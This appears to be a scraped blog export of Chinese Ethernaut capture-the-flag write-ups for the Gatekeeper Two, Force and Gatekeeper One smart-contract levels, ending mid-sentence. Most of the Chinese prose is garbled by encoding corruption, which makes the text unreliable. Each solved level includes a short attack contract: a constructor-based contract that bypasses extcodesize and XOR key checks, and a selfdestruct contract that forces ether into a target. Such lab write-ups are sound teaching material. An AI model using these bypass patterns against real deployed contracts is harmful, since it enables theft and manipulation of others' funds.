ä»ä¸Šä¸€ä¸ªå®ˆé—¨äººé‚£å­¦åˆ°äº†ä»€ä¹ˆ. ç¬¬äºŒä¸ªé—¨ä¸­çš„ assembly å…³é”®è¯å¯ä»¥è®©ä¸€ä¸ªåˆçº¦è®¿é—®éåŸç”Ÿçš„ vanilla solidity åŠŸèƒ½. å‚è§ here . extcodesize å‡½æ•°å¯ä»¥ç”¨æ¥å¾—åˆ°ç»™å®šåœ°å€åˆçº¦çš„ä»£ç é•¿åº¦ - ä½ å¯ä»¥åœ¨è¿™ä¸ªé¡µé¢å­¦ä¹ åˆ°æ›´å¤š yellow paper. ^ ç¬¦å·åœ¨ç¬¬ä¸‰ä¸ªé—¨é‡Œæ˜¯ä½æ“ä½œ (XOR), åœ¨è¿™é‡Œæ˜¯ä»£è¡¨å¦ä¸€ä¸ªå¸¸è§çš„ä½æ“ä½œ (å‚è§ here). Coin Flip å…³å¡ä¹Ÿæ˜¯ä¸€ä¸ªå¾ˆå¥½çš„å‚è€ƒ. 1.2 é¢˜ç›®ä»£ç ï¼š // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract GatekeeperTwo &#123; address public entrant; modifier gateOne() &#123; require(msg.sender != tx.origin); _; &#125; modifier gateTwo() &#123; uint x; assembly &#123; x := extcodesize(caller()) &#125; require(x == 0); _; &#125; modifier gateThree(bytes8 _gateKey) &#123; require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max); _; &#125; function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123; entrant = tx.origin; return true; &#125; &#125; 1234567891011121314## 2. åˆ†æ- 2.1 ä¸ Gatekeeper One ä¸€æ ·ï¼Œæˆ‘ä»¬å¿…é¡»æˆåŠŸé€šè¿‡å‡½æ•°çš„ 3 æ¬¡ä¿®é¥°ç¬¦æ£€æŸ¥`enter()`æ‰èƒ½åˆ›å»º`entrant`æˆ‘ä»¬çš„åœ°å€- 2.2 äº¤æ˜“å¿…é¡»ä»åˆçº¦å‘é€ï¼Œä»¥ä¾¿åˆçº¦åœ°å€ ( `msg.sender`) ä¸åˆçº¦è°ƒç”¨è€… ( `tx.origin`) ä¸åŒã€‚- `msg.sender`å’Œ`tx.origin`- ![image-20230225003313354](https://cdn.staticaly.com/gh/LBiyou/BlogImages@main/img/202306020023378.png)- åœ¨å‡½æ•°è°ƒç”¨è€…ä¸Šè¿è¡Œ solidity æ±‡ç¼–æ“ä½œç çš„ç»“æœ`extcodesize()`è¿”å›è°ƒç”¨è€…åˆçº¦ä»£ç çš„é•¿åº¦ï¼Œä½†æ˜¯ï¼Œå½“æˆ‘ä»¬ä»åˆçº¦è°ƒç”¨çš„æ„é€ å‡½æ•°æ‰§è¡Œå¤–éƒ¨è°ƒç”¨æ—¶ï¼Œ`extcodesize()`è¿”å›é›¶ï¼Œå› ä¸ºåˆçº¦åœ¨æ„é€ æœŸé—´æ²¡æœ‰å¯ç”¨çš„æºä»£ç . Consensys æ™ºèƒ½åˆçº¦æœ€ä½³å®è·µé¡µé¢ä¸­çš„[æ­¤é¡µé¢è¯¦ç»†ä»‹ç»äº†å®ƒã€‚](https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/extcodesize-checks/)å› æ­¤ï¼Œè¿™`extcodesize()`ä¸æ˜¯æ£€æŸ¥å¤–éƒ¨è°ƒç”¨æ˜¯ç”±åˆçº¦è¿˜æ˜¯å¤–éƒ¨æ‹¥æœ‰çš„å¸æˆ·æ‰§è¡Œçš„å¯é æ–¹æ³•ã€‚æˆ‘ä»¬åœ¨è¿™é‡Œè¦åšçš„å°±æ˜¯è¿è¡Œ`enter()`ä»è°ƒç”¨åˆçº¦çš„æ„é€ å‡½æ•°è°ƒç”¨å‡½æ•°çš„ä»£ç ã€‚- æŒ‰ä½`XOR`å’Œé€šè¿‡å®ƒæ“ä½œçš„æ¯ä¸ªå…ƒç´ éƒ½æ˜¯å®ƒè‡ªå·±çš„é€†ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬æœ‰å¦‚æœï¼š```jsuint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1 ä¸ºçœŸï¼Œåˆ™ï¼š 1uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1 == uint64(_gateKey) ä¹Ÿæ˜¯å¦‚æ­¤ã€‚å› æ­¤ï¼Œ*æˆ‘ä»¬ä¸éœ€è¦_gateKey*ï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•åœ°å°†ç»“æœuint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1ä½œä¸ºå‚æ•°ä¼ é€’ï¼Œenter()ä½†å¼ºåˆ¶è½¬æ¢ä¸ºbytes8as è¿™å°±æ˜¯æ‰€enter()éœ€è¦çš„ã€‚ å‚è€ƒåšå®¢ é—¨ 1ï¼šmsg.senderå’Œtx.origin è¦æ‰“å¼€è¿™æ‰‡é—¨ï¼Œæˆ‘ä»¬å¿…é¡»äº†è§£msg.senderå®ƒä»¬tx.originä¹‹é—´çš„åŒºåˆ«ã€‚ è®©æˆ‘ä»¬çœ‹çœ‹ Solidity æ–‡æ¡£å¯¹è¿™äº›å…¨å±€å˜é‡çš„çœ‹æ³•ï¼š msg.sender( address): æ¶ˆæ¯çš„å‘é€è€…ï¼ˆå½“å‰é€šè¯ï¼‰ tx.origin( address): äº¤æ˜“çš„å‘é€æ–¹ï¼ˆå®Œæ•´çš„è°ƒç”¨é“¾ï¼‰ å½“äº¤æ˜“ç”± EOA è¿›è¡Œå¹¶ç›´æ¥ä¸æ™ºèƒ½åˆçº¦äº¤äº’æ—¶ï¼Œè¿™äº›å˜é‡å°†å…·æœ‰ç›¸åŒçš„å€¼ã€‚ä½†æ˜¯ï¼Œå¦‚æœå®ƒä¸ä¸­é—´äººåˆçº¦äº¤äº’Aï¼Œç„¶åBé€šè¿‡ç›´æ¥è°ƒç”¨ï¼ˆè€Œä¸æ˜¯ a delegatecallï¼‰ä¸å¦ä¸€ä¸ªåˆçº¦äº¤äº’ï¼Œé‚£ä¹ˆè¿™äº›å€¼å°†ä¸åŒã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼š msg.senderå°†æœ‰ EOA åœ°å€ tx.origin``Aå°†æœ‰åˆåŒçš„åœ°å€ å› ä¸ºä¸ºäº†gateOneä¸æ¢å¤ï¼Œæˆ‘ä»¬éœ€è¦è®©msg.sender != tx.originè¿™æ„å‘³ç€æˆ‘ä»¬å¿…é¡»enterä»æ™ºèƒ½åˆçº¦è€Œä¸æ˜¯ç›´æ¥ä»ç©å®¶çš„ EOA è°ƒç”¨ã€‚ è¿™ä¸æ˜¯æŒ‘æˆ˜çš„ä¸€éƒ¨åˆ†ï¼Œä½†æˆ‘å»ºè®®æ‚¨é˜…è¯»æˆ‘åœ¨è¿›ä¸€æ­¥é˜…è¯»ä¸­åˆ—å‡ºçš„å…³äºä¸€äº›å®‰å…¨é—®é¢˜å’Œæœ€ä½³å®è·µtx.orginä»¥åŠä½•æ—¶ä¸åº”ä½¿ç”¨å®ƒçš„å†…å®¹ã€‚ å…³å¡2ï¼šèƒŒåçš„ç„æœºextcodesize ç¬¬äºŒä¸ªé—¨æ˜¯äº†è§£æ›´å¤šå…³äºåˆçº¦å¦‚ä½•éƒ¨ç½²ä»¥åŠåˆçº¦åœ¨éƒ¨ç½²è¿‡ç¨‹ä¸­çš„ç”Ÿå‘½å‘¨æœŸçš„ç»å¥½æœºä¼šã€‚ è®©æˆ‘ä»¬çœ‹çœ‹å‡½æ•°çš„ä»£ç ï¼š 12345678ä¿®é¥°ç¬¦ gateTwo() &#123; uint256 x; ç¨‹åºé›† &#123; x := extcodesize(caller()) &#125; require(x == 0); _; &#125; å¦‚æœè¿™æ˜¯æ‚¨ç¬¬ä¸€æ¬¡çœ‹åˆ°å…³é”®å­—assembly ï¼Œè¯·ä¸è¦å®³æ€•ã€‚è¿™å°±æ˜¯ Solidity å…è®¸æ‚¨ä½¿ç”¨ç§°ä¸ºYul. è¿™é‡Œä¸æ˜¯è®¨è®ºè¿™ä¸ªè¯é¢˜çš„åœ°æ–¹ï¼Œä½†å¦‚æœæ‚¨æƒ³äº†è§£æ›´å¤šï¼Œ Solidity æ–‡æ¡£ç½‘ç«™ä¸Šæœ‰å¤§é‡å…³äº Yul çš„å†…å®¹ã€‚ è®©æˆ‘ä»¬çœ‹çœ‹è¿™ä¸¤ä¸ªæ“ä½œç åœ¨æ‰§è¡Œæ—¶åšäº†ä»€ä¹ˆï¼š CALLERæ“ä½œç è¿”å›è°ƒç”¨è€…å¸æˆ·çš„ 20 å­—èŠ‚åœ°å€ã€‚è¿™æ˜¯æ‰§è¡Œæœ€åä¸€æ¬¡è°ƒç”¨çš„å¸æˆ·ï¼ˆå§”æ‰˜è°ƒç”¨é™¤å¤–ï¼‰ã€‚ EXCODESIZEæ“ä½œç åœ¨æ‰§è¡Œæ—¶è¿”å›ä½œä¸ºå‚æ•°ä¼ é€’çš„åœ°å€çš„ä»£ç å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ã€‚ è¿™ä¸ªé—¨è¦æ±‚çš„codeå¤§å°callerå¿…é¡»æ˜¯0ã€‚ å¦‚æœcalleræ˜¯ä¸€ä¸ªæ€»æ˜¯è¿”å›é›¶çš„ EOAï¼ˆå¤–éƒ¨æ‹¥æœ‰è´¦æˆ·ï¼‰ï¼Œä½†äº‹å®å¹¶éå¦‚æ­¤ï¼Œå› ä¸ºæ­£å¦‚æˆ‘ä»¬æ‰€è¯´ï¼Œmsg.senderç”±äºç¬¬ä¸€é—¨è¦æ±‚ï¼Œè°ƒç”¨è€… ( ) å¿…é¡»æ˜¯æ™ºèƒ½åˆçº¦ã€‚ æ™ºèƒ½åˆçº¦å¦‚ä½•å®ç°é›¶ä»£ç ï¼Ÿå¥½å§ï¼Œè¿™æ˜¯çœŸçš„æœ‰ä¸€ä¸ªç‰¹ä¾‹ã€‚æ™ºèƒ½åˆçº¦åœ¨ç¼–è¯‘æ—¶æœ‰ä¸¤ç§ä¸åŒçš„å­—èŠ‚ç ã€‚ åˆ›å»ºå­—èŠ‚ç æ˜¯ä»¥å¤ªåŠåˆ›å»ºåˆçº¦å’Œåªæ‰§è¡Œä¸€æ¬¡æ„é€ å‡½æ•°æ‰€éœ€çš„å­—èŠ‚ç  è¿è¡Œæ—¶å­—èŠ‚ç æ˜¯åˆçº¦çš„çœŸå®ä»£ç ï¼Œå­˜å‚¨åœ¨åŒºå—é“¾ä¸­çš„ä»£ç å°†ç”¨äºæ‰§è¡Œæ‚¨çš„æ™ºèƒ½åˆçº¦åŠŸèƒ½ å½“æ‰§è¡Œæ„é€ å‡½æ•°åˆå§‹åŒ–åˆçº¦å­˜å‚¨æ—¶ï¼Œå®ƒè¿”å›è¿è¡Œæ—¶å­—èŠ‚ç ã€‚ç›´åˆ°æ„é€ å‡½æ•°çš„æœ€åï¼Œåˆçº¦æœ¬èº«æ²¡æœ‰ä»»ä½•è¿è¡Œæ—¶å­—èŠ‚ç ï¼Œè¿™æ„å‘³ç€å¦‚æœä½ è°ƒç”¨address(contract).code.lengthå®ƒä¼šè¿”å›0ï¼ å¦‚æœæ‚¨æƒ³åœ¨ EVM çº§åˆ«é˜…è¯»æ›´å¤šç›¸å…³ä¿¡æ¯ï¼Œå¯ä»¥æ·±å…¥é˜…è¯» OpenZeppelin åšå®¢æ–‡ç« è§£æ„ Solidity åˆçº¦â€”â€”ç¬¬äºŒéƒ¨åˆ†ï¼šåˆ›å»ºä¸è¿è¡Œæ—¶ å› æ­¤ï¼Œè¦é€šè¿‡ç¬¬äºŒé“é—¨ï¼Œæˆ‘ä»¬åªéœ€è¦ä»æ™ºèƒ½åˆçº¦enterä¸­è°ƒç”¨å³å¯ï¼Exploiter``constructor Gate 3ï¼šé“¸é€ ã€å‘ä¸‹é“¸é€ å’Œä½è¿ç®— æœ€åä¸€æ‰‡é—¨æ˜¯å¦ä¸€æ‰‡è®©ä½ å¤§åƒä¸€æƒŠçš„é—¨ã€‚ä½ å‡†å¤‡å¥½äº†å—ï¼Ÿ æˆ‘ä»¬å†æ¬¡è®¨è®ºç±»å‹å’Œä½è¿ç®—ä¹‹é—´çš„è½¬æ¢ æ¥çœ‹çœ‹éœ€æ±‚uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1 åˆçº¦æ˜¯ç”¨0.8.xä¹‹å‰çš„Solidityç‰ˆæœ¬ç¼–è¯‘çš„ï¼Œæ‰€ä»¥åœ¨æ‰§è¡Œæ•°å­¦è¿ç®—æ—¶ä¸ä¼šå›æ»šuint64(0) - 1ã€‚æ­¤æ“ä½œæ˜¯è¡¨è¾¾â€œç»™æˆ‘ auint64å¯ä»¥å®¹çº³çš„æœ€å¤§æ•°é‡â€çš„â€œæ—§æ–¹æ³•â€ã€‚ä½ å¯ä»¥é€šè¿‡åšæ¥è¡¨è¾¾åŒæ ·çš„äº‹æƒ…type(uint64).maxã€‚ è¯¥éƒ¨åˆ†ä»ï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹æ˜¯åˆåŒï¼‰ä¸­bytes8(keccak256(abi.encodePacked(msg.sender)))è·å–ä¸å¤ªé‡è¦çš„å†…å®¹å¹¶å°†å®ƒä»¬è½¬æ¢ä¸º8 bytes``msg.sender``Exploiter``uint64 è¯¥æŒ‡ä»¤a ^ bæ˜¯æŒ‰ä½XORæ“ä½œã€‚æ“ä½œXORæ˜¯è¿™æ ·çš„ï¼šå¦‚æœ position ä¸­çš„ä½ç›¸ç­‰ï¼Œå®ƒå°†å¯¼è‡´0otherwise in a 1ã€‚ä½¿a ^ b = type(uint64).maxï¼ˆæ‰€ä»¥æ‰€æœ‰1ï¼‰bå¿…é¡»æ˜¯çš„å€’æ•°aã€‚ è¿™æ„å‘³ç€æˆ‘ä»¬gateKeyå¿…é¡»æ˜¯bytes8(keccak256(abi.encodePacked(msg.sender))) åœ¨ solidity ä¸­ï¼Œæ²¡æœ‰â€œåå‘â€æ“ä½œï¼Œä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡XORåœ¨è¾“å…¥å’Œå€¼ä¹‹é—´è¿›è¡Œæ“ä½œæ¥é‡æ–°åˆ›å»ºå®ƒFï¼Œå…¶ä¸­åªæœ‰ sã€‚ è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥gateKeyé€šè¿‡æ‰§è¡Œæ¥è®¡ç®—æ­£ç¡®çš„bytes8(keccak256(abi.encodePacked(address(this)))) ^ 0xFFFFFFFFFFFFFFFF 2.3 å‚è€ƒè§†é¢‘ å†™çš„æ”»å‡»åˆçº¦ contract Hack &#123; constructor(GatekeeperTwo target) &#123; uint64 s = uint64(bytes8(keccak256(abi.encodePacked(address(this))))); uint64 k = s ^ type(uint64).max; bytes8 key = bytes8(k); require(target.enter(key), &quot;failed&quot;); &#125; &#125; 3. è§£é¢˜ 3.1 è·å–å…³å¡å®ä¾‹åœ°å€ï¼š0xf0f0bbA56D2035804D70D9Ed802e422195b62134 3.2 é€šè¿‡ä¼ å…¥å®ä¾‹çš„åœ°å€éƒ¨ç½²æ”»å‡»åˆçº¦ 3.3 æäº¤æ¡ˆä¾‹ 3.4 æˆåŠŸï¼ï¼ï¼ï¼","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Force","slug":"Smart contracts/ethernaut/Force","date":"2023-01-09T03:32:10.000Z","updated":"2023-01-09T03:32:10.000Z","comments":true,"path":"2023/01/09/Smart contracts/ethernaut/Force/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/09/Smart%20contracts/ethernaut/Force/","excerpt":"","text":"Force1. é¢˜ç›®è¦æ±‚ 1.1 é¢˜ç›®ï¼š è¿™ä¸€å…³çš„ç›®æ ‡æ˜¯ä½¿åˆçº¦çš„ä½™é¢å¤§äº0 è¿™å¯èƒ½æœ‰å¸®åŠ©: Fallback æ–¹æ³• æœ‰æ—¶å€™æ”»å‡»ä¸€ä¸ªåˆçº¦æœ€å¥½çš„æ–¹æ³•æ˜¯ä½¿ç”¨å¦ä¸€ä¸ªåˆçº¦. é˜…è¯»ä¸Šæ–¹çš„å¸®åŠ©é¡µé¢, â€œBeyond the consoleâ€ éƒ¨åˆ† 1.2 è¦æ±‚ï¼š ä½¿åˆçº¦çš„ä½™é¢å¤§äº0 1.3 åˆçº¦ä»£ç ï¼š // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Force &#123;/* MEOW ? /\\_/\\ / ____/ o o \\ /~____ =Ã¸= / (______)__m_m) */&#125; 123456789101112131415161718192021## 2. åˆ†æ- 2.1 æˆ‘çœ‹åˆ°è¿™ä¸ªåˆçº¦é¦–å…ˆæ˜¯æŒºæ— è¯­çš„å“ˆå“ˆå“ˆå“ˆğŸ¤£ğŸ¤£ğŸ¤£- 2.2 åˆçº¦ä¸­æ²¡æœ‰æ²¡æœ‰fallbackå’Œreceiveå‡½æ•°æ¥æ”¶ä»¥å¤ªï¼Œä¹Ÿæ²¡æœ‰ä»»ä½•ä¸€ä¸ªpayableçš„å‡½æ•°å¯ä»¥æ¥æ”¶ä»¥å¤ªï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½å¼ºåˆ¶ç»™è¯¥åˆçº¦æ‰“é’±- 2.3 ç”±äºåˆçº¦ä¸­ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œæ‰€ä»¥æˆ‘ä»¬å”¯ä¸€èƒ½è§£å†³è¿™ä¸ªæŒ‘æˆ˜çš„å°±æ˜¯ä½¿ç”¨æ–¹æ³•`selfdestruct()`- 2.4 selfdestruct()å‡½æ•°çš„è§£é‡Šï¼š `selfdestruct`å‘½ä»¤å¯ä»¥ç”¨æ¥åˆ é™¤æ™ºèƒ½åˆçº¦ï¼Œå¹¶å°†è¯¥åˆçº¦å‰©ä½™`ETH`è½¬åˆ°æŒ‡å®šåœ°å€ã€‚`selfdestruct`æ˜¯ä¸ºäº†åº”å¯¹åˆçº¦å‡ºé”™çš„æç«¯æƒ…å†µè€Œè®¾è®¡çš„ã€‚å®ƒæœ€æ—©è¢«å‘½åä¸º`suicide`ï¼ˆè‡ªæ€ï¼‰ï¼Œä½†æ˜¯è¿™ä¸ªè¯å¤ªæ•æ„Ÿã€‚ä¸ºäº†ä¿æŠ¤æŠ‘éƒçš„ç¨‹åºå‘˜ï¼Œæ”¹åä¸º`selfdestruct`ã€‚- selfdestruct() å‡½æ•°çš„ä½¿ç”¨ï¼š- ![image-20230224170947882](https://cdn.staticaly.com/gh/LBiyou/BlogImages@main/img/202306020022611.png)- 2.5 æ”»å‡»åˆçº¦- ```solidity contract Exploiter &#123; constructor(address payable _to) public payable &#123; // è‡ªæ¯æ—¶å°†æ‰€æœ‰çš„ `msg.value` é‡å®šå‘åˆ° `to` selfdestruct(_to); &#125; &#125; éƒ¨ç½²Exploiteråˆçº¦, æ„é€ å™¨é»˜è®¤å°†Expoliteråˆçº¦çš„ä½™é¢è½¬ç»™ _to åœ°å€ 3. è§£é¢˜ 3.1 è·å–å…³å¡å®ä¾‹åœ°å€ï¼š0x896317e85Fb12eA5bAD846A59870f3F672fAB7A4 3.2 éƒ¨ç½²æ”»å‡»åˆçº¦ï¼Œå¹¶åœ¨éƒ¨ç½²æ—¶å¡«å…¥å…³å¡å®ä¾‹åœ°å€ 3.3 è°ƒç”¨Deploy() å‡½æ•° 3.4 è°ƒç”¨å®ä¾‹éƒ¨ç½²çš„åˆçº¦æŸ¥çœ‹åˆçº¦ä½™é¢ï¼Œç»“æœ balance &gt; 0 3.5 æäº¤æ¡ˆä¾‹ï¼Œå¹¶æŸ¥çœ‹è¿”å›ç»“æœ 3.6 æˆåŠŸï¼ï¼ï¼ï¼","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Gatekeeper One","slug":"Smart contracts/ethernaut/Gatekeeper One","date":"2023-01-09T03:02:15.000Z","updated":"2023-01-09T03:02:15.000Z","comments":true,"path":"2023/01/09/Smart contracts/ethernaut/Gatekeeper One/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/09/Smart%20contracts/ethernaut/Gatekeeper%20One/","excerpt":"","text":"Gatekeeper One1. é¢˜ç›®è¦æ±‚ 1.1 è¶Šè¿‡å®ˆé—¨äººå¹¶ä¸”æ³¨å†Œä¸ºä¸€ä¸ªå‚èµ›è€…æ¥å®Œæˆè¿™ä¸€å…³. è¿™å¯èƒ½æœ‰å¸®åŠ©: æƒ³ä¸€æƒ³ä½ åœ¨ Telephone å’Œ Token å…³å¡å­¦åˆ°çš„çŸ¥è¯†. ä½ å¯ä»¥åœ¨ solidity æ–‡æ¡£ä¸­æ›´æ·±å…¥çš„äº†è§£ gasleft() å‡½æ•° (å‚è§ here å’Œ here). 1.2 é¢˜ç›®ä»£ç  // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract GatekeeperOne &#123; address public entrant; modifier gateOne() &#123; require(msg.sender != tx.origin); _; &#125; modifier gateTwo() &#123; require(gasleft() % 8191 == 0); _; &#125; modifier gateThree(bytes8 _gateKey) &#123; require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;); require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;); require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;); _; &#125; function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123; entrant = tx.origin; return true; &#125; &#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243## 2.åˆ†æ#### tipsï¼š[å‚è€ƒåšå®¢](https://stermi.medium.com/the-ethernaut-challenge-13-solution-gatekeeper-one-7587bfb38550)- 2.1è®©æˆ‘ä»¬æŠŠè§£é‡Šåˆ†æˆä¸‰ä¸ªä¸åŒçš„éƒ¨åˆ† é—¨ 1ï¼š`msg.sender`å’Œ`tx.origin` è¦æ‰“å¼€è¿™æ‰‡é—¨ï¼Œæˆ‘ä»¬å¿…é¡»äº†è§£`msg.sender`å®ƒä»¬`tx.origin`ä¹‹é—´çš„åŒºåˆ«ã€‚ [è®©æˆ‘ä»¬çœ‹çœ‹ Solidity æ–‡æ¡£å¯¹è¿™äº›å…¨å±€å˜é‡çš„](https://docs.soliditylang.org/en/latest/cheatsheet.html?#global-variables)çœ‹æ³•ï¼š - `msg.sender`( `address`): æ¶ˆæ¯çš„å‘é€è€…ï¼ˆå½“å‰é€šè¯ï¼‰ - `tx.origin`( `address`): äº¤æ˜“çš„å‘é€æ–¹ï¼ˆå®Œæ•´çš„è°ƒç”¨é“¾ï¼‰ å½“äº¤æ˜“ç”± EOA è¿›è¡Œå¹¶ç›´æ¥ä¸æ™ºèƒ½åˆçº¦äº¤äº’æ—¶ï¼Œè¿™äº›å˜é‡å°†å…·æœ‰ç›¸åŒçš„å€¼ã€‚ä½†æ˜¯ï¼Œå¦‚æœå®ƒä¸ä¸­é—´äººåˆçº¦äº¤äº’`A`ï¼Œç„¶å`B`é€šè¿‡ç›´æ¥è°ƒç”¨ï¼ˆè€Œä¸æ˜¯ a `delegatecall`ï¼‰ä¸å¦ä¸€ä¸ªåˆçº¦äº¤äº’ï¼Œé‚£ä¹ˆè¿™äº›å€¼å°†ä¸åŒã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼š - `msg.sender`å°†æœ‰ EOA åœ°å€ - `tx.origin``A`å°†æœ‰åˆåŒçš„åœ°å€ å› ä¸ºä¸ºäº†`gateOne`ä¸æ¢å¤ï¼Œæˆ‘ä»¬éœ€è¦è®©`msg.sender != tx.origin`è¿™æ„å‘³ç€æˆ‘ä»¬å¿…é¡»`enter`ä»æ™ºèƒ½åˆçº¦è€Œä¸æ˜¯ç›´æ¥ä»ç©å®¶çš„ EOA è°ƒç”¨ã€‚ è¿™ä¸æ˜¯æŒ‘æˆ˜çš„ä¸€éƒ¨åˆ†ï¼Œä½†æˆ‘å»ºè®®æ‚¨é˜…è¯»æˆ‘åœ¨è¿›ä¸€æ­¥é˜…è¯»ä¸­åˆ—å‡ºçš„å…³äºä¸€äº›å®‰å…¨é—®é¢˜å’Œæœ€ä½³å®è·µ`tx.orgin`ä»¥åŠä½•æ—¶**ä¸åº”**ä½¿ç”¨å®ƒçš„å†…å®¹ã€‚ 2å·é—¨ï¼š`gasleft()` [ä»å…³äºå…¨å±€å˜é‡](https://docs.soliditylang.org/en/latest/cheatsheet.html?#global-variables)çš„ Solidity æ–‡æ¡£ä¸­æˆ‘ä»¬çŸ¥é“è¿™æ˜¯ä¸€ä¸ªè¿”å›äº¤æ˜“**å‰©ä½™æ°”ä½“**`gasleft() returns (uint256)`çš„å‡½æ•°ã€‚ é‡è¦çš„æ˜¯è¦çŸ¥é“æ¯ä¸ª Solidity æŒ‡ä»¤å®é™…ä¸Šæ˜¯ä¸€ç³»åˆ—ä½çº§ EVM æ“ä½œç çš„é«˜çº§è¡¨ç¤ºã€‚æ‰§è¡Œæ“ä½œç å`GAS`ï¼ˆåœ¨[EVM ä»£ç æ–‡æ¡£ç«™ç‚¹](https://www.evm.codes/#5a)ä¸Šé˜…è¯»æ›´å¤šå†…å®¹ï¼‰ï¼Œè¿”å›å€¼æ˜¯æ‰§è¡Œ**å**å‰©ä½™çš„æ°”ä½“é‡ï¼Œä¹Ÿæ˜¯`GAS`å½“å‰æ¶ˆè€—**2 gas**çš„æ“ä½œç ã€‚ äº‹æƒ…åœ¨è¿™é‡Œå˜å¾—è¿‡äºå¤æ‚ï¼Œå› ä¸ºè¦é€šè¿‡æ£€æŸ¥ï¼Œ`gateTwo`æ‚¨å¿…é¡»è°ƒç”¨`level.enter&#123;gas: exactAmountOfGas&#125;(gateKey)`éå¸¸ç‰¹å®šæ•°é‡çš„æ°”ä½“ï¼Œä»¥ä¾¿`gasleft().mod(8191)`è¿”å›`0`ï¼ˆå‰©ä½™çš„æ°”ä½“å¿…é¡»æ˜¯ 8191 çš„å€æ•°ï¼‰ã€‚ ä½ çŒœä¸åˆ°è¿™ä¸ªæ•°å­—ï¼Œå› ä¸ºä½ éœ€è¦ç¿»è¯‘ EVM æ“ä½œç ä¸­çš„æ‰€æœ‰ Solidity ä»£ç ï¼Œè®¡ç®—å®ƒä»¬å„è‡ªæ¶ˆè€—çš„ gas å¹¶æµªè´¹å¤§é‡æ—¶é—´ï¼ˆé™¤éä½ çš„ç›®æ ‡ä¹Ÿæ˜¯æŒæ¡ EVMï¼Œä½†å¯¹äºè¿™ä¸ªä¸»é¢˜æœ‰è¿˜æœ‰å¤§é‡å…¶ä»–èµ„æºï¼Œä¾‹å¦‚[è®©æˆ‘ä»¬ç© EVM è°œé¢˜â€”â€”è¾¹ç©è¾¹å­¦ä¹ ä»¥å¤ªåŠ EVMï¼](https://stermi.medium.com/lets-play-evm-puzzles-learning-ethereum-evm-while-playing-43a8354a02b3)ï¼‰ã€‚æ‚¨è¿˜éœ€è¦è®°ä½ï¼Œgas æˆæœ¬å¯èƒ½ä¼šæœ‰æ‰€ä¸åŒï¼Œå…·ä½“å–å†³äºä½¿ç”¨å“ªä¸ª Solidity ç¼–è¯‘å™¨ç‰ˆæœ¬å°†ä»£ç ç¼–è¯‘ä¸ºå­—èŠ‚ç ä»¥åŠåœ¨æ­¤è¿‡ç¨‹ä¸­ä½¿ç”¨äº†å“ªäº›ç¼–è¯‘æ ‡å¿—ã€‚ä¸€å›¢ç³Ÿã€‚ æˆ‘ä»¬å¯ä»¥åšä»€ä¹ˆï¼Ÿå¥½å§ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ç®€å•çš„æ–¹æ³•å»**æš´åŠ›ç ´è§£å®ƒï¼**æŒ‰ç…§[cmichel çš„](https://cmichel.io/ethernaut-solutions/)å»ºè®®ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æˆ‘ä»¬æ­£åœ¨ä½¿ç”¨æœ¬åœ°æµ‹è¯•ç¯å¢ƒï¼ˆæˆ–åˆ†å‰çš„ç¯å¢ƒï¼‰è¿™ä¸€äº‹å®ã€‚ æˆ‘ä»¬çŸ¥é“äº¤æ˜“ä½¿ç”¨çš„ gas`enter`å¿…é¡»è‡³å°‘ä¸º 8191 åŠ ä¸Šæ‰§è¡Œè¿™äº›æ“ä½œç æ‰€èŠ±è´¹çš„æ‰€æœ‰ gasã€‚æˆ‘ä»¬å¯ä»¥è¿›è¡ŒèŒƒå›´çŒœæµ‹å¹¶å¯¹å…¶è¿›è¡Œæš´åŠ›ç 